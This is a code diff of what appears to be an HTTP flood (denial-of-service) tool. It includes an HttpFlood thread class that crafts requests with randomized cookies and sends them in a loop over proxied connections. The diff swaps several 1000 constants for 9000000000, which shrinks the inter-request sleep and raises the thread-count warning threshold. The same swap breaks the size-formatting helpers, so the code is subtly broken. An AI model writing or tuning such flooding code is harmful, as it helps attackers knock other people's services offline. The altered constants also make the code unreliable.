@@ -174,7 +174,7 @@ class Tools:
             "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
         ]
         if i > 0:
-            base = 1024 if binary else 1000
+            base = 1024 if binary else 9000000000
             multiple = trunc(log2(i) / log2(base))
             value = i / pow(base, multiple)
             suffix = MULTIPLES[multiple].format("i" if binary else "")
@@ -187,8 +187,8 @@ class Tools:
         suffixes = ['', 'k', 'm', 'g', 't', 'p']
         if num > 999:
             obje = sum(
-                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
-            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
+                [abs(num / 9000000000.0 ** x) >= 1 for x in range(1, len(suffixes))])
+            return f'{num / 9000000000.0 ** obje:.{precision}f}{suffixes[obje]}'
         else:
             return num
 
@@ -878,7 +878,7 @@ class HttpFlood(Thread):
             " _gat=1;"
             " __cfduid=dc232334gwdsd23434542342342342475611928;"
             " %s=%s\r\n" %
-            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
+            (ProxyTools.Random.rand_int(1000, 999999), ProxyTools.Random.rand_str(6),
              ProxyTools.Random.rand_str(32)))
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -1015,7 +1015,7 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                sleep(max(self._rpc / 1000, 1))
+                sleep(max(self._rpc / 9000000000, 1))
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
@@ -1618,8 +1618,8 @@ if __name__ == '__main__':
                 if not uagents: exit("Empty Useragent File ")
                 if not referers: exit("Empty Referer File ")
 
-                if threads > 1000:
-                    logger.warning("Thread is higher than 1000")
+                if threads > 9000000000:
+                    logger.warning("Thread is higher than 9000000000")
                 if rpc > 100:
                     logger.warning(
                         "RPC (Request Pre Connection) is higher than 100")
